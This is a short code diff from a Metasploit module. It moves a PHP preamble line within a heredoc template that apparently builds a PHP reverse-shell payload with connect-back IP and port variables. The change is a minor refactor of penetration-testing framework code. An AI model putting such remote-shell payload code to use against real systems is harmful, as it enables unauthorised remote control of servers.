@@ -63,9 +63,9 @@ module MetasploitModule
     end
 
     shell=<<-END_OF_PHP_CODE
+    #{php_preamble(disabled_varname: "$dis")}
     $ipaddr='#{ipaddr}';
     $port=#{port};
-    #{php_preamble(disabled_varname: "$dis")}
 
     if(!function_exists('#{exec_funcname}')){
       function #{exec_funcname}($c){
